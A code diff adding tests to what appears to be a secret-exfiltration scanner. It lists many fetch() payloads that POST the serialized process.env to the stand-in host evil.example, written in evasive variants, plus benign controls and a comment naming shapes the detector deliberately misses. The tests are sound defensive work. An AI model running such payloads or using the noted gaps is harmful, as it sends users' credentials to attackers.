@@ -158,3 +158,56 @@ test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exf
     });
   }
 });
+
+test("JSON.stringify spread of process.env is detected as secret-exfiltration", () => {
+  const exfilPayloads = [
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process.env) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({ ...process.env }) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({...process.env}) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({  ...  process.env  }) })",
+    // pretty-print and replacer arguments do not change what is serialized
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process.env, null, 2) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({ ...process.env }, null, 2) })",
+    // extra fields alongside the whole env still serialize all secrets
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({ ...process.env, host: 'x' }) })",
+    // nested as a value
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({ env: process.env }) })",
+    // a block comment before the closer is a one-token undo of the spread case
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({ ...process.env /*c*/ }) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process.env /* x */) })",
+    // bracket/quoted property access is runtime-identical to process.env
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process['env']) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process[\"env\"]) })",
+    "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify({ ...process['env'] }) })",
+  ];
+  for (const payload of exfilPayloads) {
+    const inspection = inspected("scripts/setup.js", `${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({
+      payload,
+      findings: ["secret-exfiltration"],
+    });
+  }
+});
+
+test("single-key reads and non-whole-env wrappers keep no finding", () => {
+  // Controls that must stay clean, including the shapes left out of scope:
+  // an arbitrary-depth nested object, an array wrapper, and Object.assign are
+  // separate shapes a regex indicator does not chase.
+  const benign = [
+    "const home = JSON.stringify(process.env.HOME);",
+    "const m = JSON.stringify({ mode: process.env.NODE_ENV });",
+    "const d = JSON.stringify({ ...defaults, port: process.env.PORT });",
+    "const o = JSON.stringify({ ...process.env.NODE_OPTIONS });",
+    "const h = JSON.stringify(process['env'].HOME);",
+  ];
+  for (const payload of benign) {
+    const inspection = inspected("scripts/setup.js", `${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({ payload, findings: [] });
+  }
+});
